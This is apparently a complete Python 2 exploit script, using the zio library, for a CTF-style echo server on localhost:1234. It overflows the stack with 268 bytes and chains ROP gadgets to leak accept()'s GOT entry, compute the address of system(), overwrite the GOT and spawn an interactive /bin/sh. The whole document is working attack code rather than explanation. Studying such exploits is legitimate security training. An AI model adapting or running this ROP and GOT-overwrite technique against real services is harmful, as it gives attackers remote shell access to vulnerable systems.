from zio import *
from struct import pack, unpack

'''
    a re-echo server
    we could use recv_line to write the memory, send_len to send the string
    recv_line(buf) : only take 1 arg, when get '\n' it stops.
    send_len(buf, n) : send n bytes of datas, easy to use.
    the typical steps for ROP, overwrite accept's GOT with system's and call it.

    ATTENTION: we should read the echo message of our payload, but the size may not be the length of payload,
                because the server use sendstr func to send the message, if there is a \0 in payload the string will be cut.
'''

host = 'localhost'
port = 1234
target = (host, port)
cmd = '/bin/sh\x00\n'

buf = 0x804a058
pppr = 0x8048c0d
ppr = pppr + 1
pr = ppr + 1

recv_line = 0x8048744
send_len = 0x80487cc
send_str = 0x8048848
accept_plt = 0x80485c0
accept_got = 0x804a01c
accept_addr = 0xf0200
system_addr = 0x3ee80
system_accept_diff = system_addr - accept_addr

io = zio(target, print_write=False, print_read=COLORED(REPR, 'red'), timeout=9999999)

payload = 'A' * 268
rop_chain = [
            # system()
            buf,
            0x44444444,
            accept_plt,
            
            # recv_line(), overwrite accept got
            accept_got,
            pr,
            recv_line,

            # sendlen(), get the got of accept
            4,
            accept_got,
            ppr,
            send_len,

            # recv_line(), write the cmd
            buf,
            pr,
            recv_line
        ]
payload += ''.join([pack('<I',item) for item in rop_chain[::-1]])
io.read_line()
if '\n' in payload:
    print 'there is a CR in payload, cannot build!'
if '\x00' in payload:
    print 'there is a 0 in payload, recalculate the length!'
    length = payload.find('\x00')
else:
    length = len(payload)
io.write(payload+'\x00\n')
io.read(length)
io.write(cmd)

this_accept_addr = unpack('<I', io.read(4))[0]
this_system_addr = this_accept_addr + system_accept_diff
print '[+] accept at 0x%08x' % this_accept_addr
print '[+] system at 0x%08x' % this_system_addr
io.write(pack('<I', this_system_addr)+'\x00\n')
io.interact()

